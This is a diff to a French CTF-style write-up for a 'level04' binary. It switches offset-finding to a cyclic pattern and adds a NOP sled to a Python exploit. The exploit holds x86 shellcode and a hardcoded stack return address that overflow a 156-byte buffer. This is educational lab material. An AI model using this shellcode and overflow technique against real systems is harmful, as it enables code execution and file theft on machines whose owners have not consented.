@@ -27,28 +27,15 @@ Dans GDB, il faut suivre le fils (sinon GDB suit le pere bloque dans `wait()`).
 ```bash
 gdb ./level04
 set follow-fork-mode child
+run 
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 ```
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1970]
+0x41326641 in ?? ()
 
-Test avec 184 octets pour confirmer un crash :
-
-```bash
-python -c "print('A'*184 + 'BBBB')" > /tmp/input.txt
-run < /tmp/input.txt
-info registers eip
-# 0x41414141 : le return address est dans les A's, donc padding < 184
-```
-
-Recherche binaire :
-- 164 : crash (EIP = A's), padding < 164
-- 152 : pas de crash, padding > 152
-- 158 : EIP = `0x42424141` (A's et B's melanges), padding entre 156 et 158
-
-```bash
-python -c "print('A'*156 + 'BBBB')" > /tmp/input.txt
-run < /tmp/input.txt
-info registers eip
-# 0x42424242 ok
-```
+0x41326641 == 156 octets
 
 **Padding = 156 octets.**
 
@@ -104,7 +91,9 @@ Ne pas coller du Python directement dans le terminal shell.
 cat > /tmp/exploit.py << 'EOF'
 import sys
 
-shellcode = (
+nop = "\x90" * 40
+
+shellcode = nop + (
     "\xeb\x32\x5b"
     "\x31\xc0\xb0\x05\x31\xc9\x31\xd2\xcd\x80"
     "\x89\xc3\x83\xec\x40\x89\xe1"
@@ -117,7 +106,7 @@ shellcode = (
 )
 
 padding = "A" * (156 - len(shellcode))
-ret     = "\xa0\xd6\xff\xff"
+ret = "\xa0\xd6\xff\xff" 
 
 sys.stdout.write(shellcode + padding + ret)
 EOF
